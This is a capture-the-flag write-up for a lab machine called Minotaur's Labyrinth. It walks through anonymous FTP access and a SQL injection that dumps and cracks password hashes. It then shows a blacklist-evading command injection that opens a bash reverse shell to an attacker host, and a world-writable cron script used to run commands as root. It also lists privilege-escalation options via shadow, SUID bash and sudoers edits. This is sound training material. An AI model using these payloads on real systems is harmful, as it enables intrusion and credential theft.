# Minotaur's Labyrinth

**Machine IP may change over the document**

----

## Enumeration

### Nmap: `sudo nmap 10.10.34.233 -oN nmap-initial`

```bash
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql
```

### Gobuster: `gobuster dir -u http://$IP -w common.txt| tee gobuster-scan`

Gobuster scan or any other directory based scan cannot be done as *the server returns a status code that matches the provided options for non existing urls. http://10.10.39.182/b9462028-7e63-44b2-9fb6-135ae540d9be => 302 (Length: 3562).* Meaning server would return a code 302 for every word in wordlist making it useless.

## Flag-1

Doing anonymous login to FTP reveals a bunch of files and also reveals a flag inside a file named *flag.txt*.

## Flag-2

On visiting the IP address at port 80 we are greeted with a login form. Checking the source code of the page reveals *login.js*. Inside this file we have the following code:

```javascript
function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
```

We have got a username *Daedalus* with password being generated from three different arrays. Using username `Daedalus` with password `g2e55kh4ck5r` logs us in to User-panel

Searching for *Daedalus* under people we get:

```bash
ID 	Name 		Password
4	Daedalus	b8e4c23686a3a12476ad7779e35f5eb6
```

Searching for user *Daedalus* under People gives a table containing ID, Name and password hash. 

```bash			
[[{"idPeople":"4","namePeople":"Daedalus","passwordPeople":"b8e4c23686a3a12476ad7779e35f5eb6"}]]
```

Trying the simplest SQLi payload: `' or '1'='1` we get the following table from both Creatures and People. Password hashes were cracked using [Crackstation](https://crackstation.net)

```bash
ID 	Name 			Passwordhash 							Password
---------------------------------------------------------------------------
Creatures
1	Cerberos		3898e56bf6fa6ddfc3c0977c514a65a8		soviet911210036173
2	Pegasus			5d20441c392b68c61592b2159990abfe		pizzaeater_1
3	Chiron			f847149233ae29ec0e1fcf052930c044		hiphophugosoviet18	
4	Centaurus		ea5540126c33fe653bf56e7a686b1770		elcentauro
People
1	Eurycliedes		42354020b68c7ed28dcdeabd5a2baf8e		greeklover
2	Menekrates		0b3bebe266a81fbfaa79db1604c4e67f		greeksalad
3	Philostratos	b83f966a6f5a9cff9c6e1c52b0aa635b		nickthegreek
4	Daedalus		b8e4c23686a3a12476ad7779e35f5eb6		g2e55kh4ck5r
5	M!n0taur		1765db9457f496a39859209ee81fbda4		aminotauro
```

Logging in as user *M!n0taur* gives us second flag.

## Flag-3

Once logged in as user *M!n0taur*. We have a link to *secret page*. The page just echoes back whatever string is thrown to it. This could be a possible point for command injection.

```bash
Payload     Response
--------------------------------------------------------------------------------		
hello;pwd   You really think this is gonna be possible i fixed this @Deadalus -_- !!!? 
hello|pwd   /opt/lampp/htdocs
hello=      You really think this is gonna be possible i fixed this @Deadalus -_- !!!?
```

The first two payloads confirm that there is a command injection though some characters might be blacklisted for eg: `;`. That means a normal reverse shell command might not be possible.

```bash
bash -i >& /dev/tcp/$attacker-IP/9001 0>&1
```

Encoding the above command with base64 I had `=` character at the end of my base64 encoded string. As seen in payload no 3, `=` is also a blacklisted character making the payload ineffective. In order to make it work I just need to remove `=` from my base64 encoded string. That can be done easily by encoding the base64 encoded string once again. This removed any bad characters and can now be sent as a payload.

Final payload:
```bash
hello| <base64_encoded_string> |base64 -d|base64 -d|bash
```

Enabling a `netcat` listener on port 9001 and sending the payload results in a reverse shell as intended. Just listing the */home* dir we have a *user* directory where the next flag can be found.

## Root.txt

Trying to find binaries with suid bit set.

```bash
find / -perm -u=s -type f 2>/dev/null
```

After a while it did not respond, so I had to kill the process. Looking manually through */etc/crontab* reveals nothing. After exploring the file system for a bit I found that */timers* directory is world writable/readable.

Even the file */timers/timer.sh* is world readable/writable. Looking at the file it seems to just print a bunch of characters to some file. It seems the file is being executed every minute or so.

Creating a viewable file and adding custom commands to *timer.sh*:

```bash
touch /tmp/file; chmod 666 /tmp/file
echo "id > /tmp/file" > timer.sh
echo "bash -i >& /dev/tcp/$attacker-IP/9999 0>&1" >> timer.sh
```

Enabling a `netcat` listener on port 9999 on waiting for the reverse connection which never came back. Looking at the */tmp/file* we have output of `id` command indicating that the command was executed as root user. It seems the reverse shell has some issues, changing the command inside *timer.sh* file.

```bash
echo "ls /root/ > /tmp/file" > timer.sh
```

After a while we have files inside */root* dir listed to file */tmp/file*. We have a peculiar file with name *da_king_flek.txt*. Outputing the contents of this file. 

```bash
echo "cat /root/da_king_flek.txt > /tmp/file" > timer.sh
```

Checking the */tmp/file* we have our root flag. I did not do root as I could just read the flag file without gaining root access. Though root access can be gained by any of the following methods:

- Changing the root password by replacing the original password with a custom password and using that custom password to gain root access. This can be done by using `openssl` to generate a password and replacing the older password with the new password by using `sed` command. The below hash is generated for string `hello`.

```bash
openssl passwd -1
Password: 
Verifying - Password: 
$1$qG0jgvrP$P2U1THrlcmF5ySwwdXIoe0
```

- Another method would be to set suid bit for */bin/bash* and then use that to gain root privileges.

- Or just setting `sudo -s` as a command that can be used by any user without password by editing/adding appropriate config settings to */etc/sudoers*.
